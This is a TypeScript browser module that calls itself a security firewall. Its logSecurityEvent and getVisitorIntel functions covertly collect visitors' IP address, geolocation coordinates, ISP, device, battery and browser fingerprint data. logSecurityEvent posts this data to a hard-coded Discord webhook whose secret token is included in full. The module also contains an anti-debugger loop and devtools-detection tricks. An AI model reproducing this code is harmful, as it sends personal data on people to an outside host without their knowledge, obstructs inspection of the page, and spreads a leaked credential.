/**
 * Security Neural Firewall V5.0
 * Specialized protection against unauthorized access and debugging.
 */

const WEBHOOK_URL = 'https://discord.com/api/webhooks/1494839483869302826/abiDZE_a2tXPZr0qx9myzxatFaO3VXXHqqGR-7XA7YXGQ2Or1o6uAbeP5-9RuQxiqpHq';

const lastSentMap = new Map<string, number>();
const COOLDOWN_MS = 60000; // 1 minute cooldown per event type

export async function logSecurityEvent(type: string, detail: string = 'No details') {
  const now = Date.now();
  const lastSent = lastSentMap.get(type) || 0;

  if (now - lastSent < COOLDOWN_MS) {
    return; // Skip if in cooldown
  }

  lastSentMap.set(type, now);

  try {
    let geoInfo = 'Fetching...';
    let ip = 'Unknown';
    let mapUrl = '';
    let networkInfo = 'Unknown';

    try {
      const geoResponse = await fetch('https://ipapi.co/json/');
      const geoData = await geoResponse.json();
      ip = geoData.ip || 'Unknown';
      geoInfo = `${geoData.city}, ${geoData.region}, ${geoData.country_name} (Lat: ${geoData.latitude}, Lon: ${geoData.longitude})`;
      networkInfo = `${geoData.org || 'Unknown'} (${geoData.asn || 'Unknown'})`;
      
      if (geoData.latitude && geoData.longitude) {
        mapUrl = `https://static-maps.yandex.ru/1.x/?ll=${geoData.longitude},${geoData.latitude}&size=450,450&z=13&l=map&pt=${geoData.longitude},${geoData.latitude},pm2rdl`;
      }
    } catch (e) {
      geoInfo = 'Geo lookup failed (CORS or Blocked)';
    }

    const clientInfo = {
      userAgent: navigator.userAgent,
      language: navigator.language,
      platform: navigator.platform,
      screen: `${window.screen.width}x${window.screen.height}`,
      cores: navigator.hardwareConcurrency || 'N/A',
      referrer: document.referrer || 'Direct'
    };

    const payload: any = {
      embeds: [{
        title: '🚨 SECURITY_VIOLATION_DETECTED',
        color: 0xff0000,
        fields: [
          { name: 'TYPE', value: `\`${type}\``, inline: true },
          { name: 'IP_ADDRESS', value: `\`${ip}\``, inline: true },
          { name: 'TIMESTAMP', value: `\`${new Date().toISOString()}\``, inline: true },
          { name: 'LOCATION', value: `\`${geoInfo}\``, inline: false },
          { name: 'NETWORK / ISP', value: `\`${networkInfo}\``, inline: false },
          { name: 'BROWSER / OS', value: `\`${clientInfo.userAgent.slice(0, 200)}\``, inline: false },
          { name: 'PLATFORM', value: `\`${clientInfo.platform}\``, inline: true },
          { name: 'SCREEN_RESOL', value: `\`${clientInfo.screen}\``, inline: true },
          { name: 'CORES', value: `\`${clientInfo.cores}\``, inline: true },
          { name: 'REFERRER', value: `\`${clientInfo.referrer.slice(0, 100)}\``, inline: false },
          { name: 'DETAIL', value: `\`\`\`${detail}\`\`\`` }
        ],
        footer: { text: 'Alzaabi Team' }
      }]
    };

    if (mapUrl) {
      payload.embeds[0].image = { url: mapUrl };
    }

    await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  } catch (error) {
    console.warn('Security logging failed');
  }
}

export async function getVisitorIntel() {
  try {
    const geoResponse = await fetch('https://ipapi.co/json/');
    const geoData = await geoResponse.json();
    
    // Attempt battery info
    let batteryInfo = 'N/A';
    try {
      const battery: any = await (navigator as any).getBattery?.();
      if (battery) {
        batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Discharging'})`;
      }
    } catch {}

    // Connection info
    const conn: any = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
    const connectionInfo = conn ? `${conn.effectiveType || 'Unknown'} (~${conn.downlink || '?'} Mbps)` : 'Unknown';

    return {
      ip: geoData.ip || 'Unknown',
      location: `${geoData.city || ''}, ${geoData.region || ''}, ${geoData.country_name || ''}`,
      coords: { lat: geoData.latitude, lon: geoData.longitude },
      network: geoData.org || 'Unknown',
      asn: geoData.asn || 'Unknown',
      timezone: geoData.timezone || 'Unknown',
      currency: geoData.currency || 'Unknown',
      postal: geoData.postal || 'Unknown',
      client: {
        ua: navigator.userAgent,
        platform: navigator.platform,
        screen: `${window.screen.width}x${window.screen.height}`,
        language: navigator.language,
        cores: navigator.hardwareConcurrency || 'N/A',
        memory: (navigator as any).deviceMemory ? `${(navigator as any).deviceMemory} GB` : 'N/A',
        battery: batteryInfo,
        connection: connectionInfo,
        cookies: navigator.cookieEnabled ? 'Enabled' : 'Disabled'
      }
    };
  } catch (e) {
    return null;
  }
}

// Anti-Debugger Loop
export function startAntiDebug() {
  const check = () => {
    (function () {
      return false;
    })
      ["constructor"]("debugger")
      ["call"]();
  };

  setInterval(() => {
    check();
  }, 100);
}

// Detect if console is open via threshold
export function detectDevTools(onDetect: () => void) {
  const threshold = 200; // Increased threshold
  let devtoolsOpen = false;

  const check = () => {
    const widthDiff = window.outerWidth - window.innerWidth;
    const heightDiff = window.outerHeight - window.innerHeight;
    
    if ((widthDiff > threshold || heightDiff > threshold) && !devtoolsOpen) {
      devtoolsOpen = true;
      onDetect();
    } else if (widthDiff < threshold && heightDiff < threshold) {
      devtoolsOpen = false;
    }
  };

  window.addEventListener('resize', check);
  // Also try the console.log getter trick
  const devtools = {
    isOpen: false,
    orientation: undefined
  };
  const element = new Image();
  Object.defineProperty(element, 'id', {
    get: function () {
      if (!devtoolsOpen) {
        devtoolsOpen = true;
        onDetect();
      }
    }
  });
  console.log(element);
}

// Memory / Performance monitor to detect heavy probes
export function monitorPerformance(onAnomaly: () => void) {
  let lastTime = performance.now();
  
  setInterval(() => {
    const currentTime = performance.now();
    if (currentTime - lastTime > 1500) { // 1.5s threshold
      onAnomaly();
    }
    lastTime = currentTime;
  }, 500); // Check every 0.5s
}

// Authorized Origin Validation
const AUTH_ZONES = [
  'ais-dev-6wp7ozzu7rxgl2k4y7cgsr-370633190819.europe-west1.run.app',
  'ais-pre-6wp7ozzu7rxgl2k4y7cgsr-370633190819.europe-west1.run.app',
  'localhost',
  '127.0.0.1'
];

export function validateEnvironment(): boolean {
  const currentHost = window.location.hostname;
  
  if (!AUTH_ZONES.includes(currentHost)) {
    console.error('CRITICAL: UNAUTHORIZED_DEPLOYMENT_DETECTED');
    logSecurityEvent('UNAUTHORIZED_DEPLOYMENT', `Host: ${currentHost}`);
    return false;
  }
  return true;
}
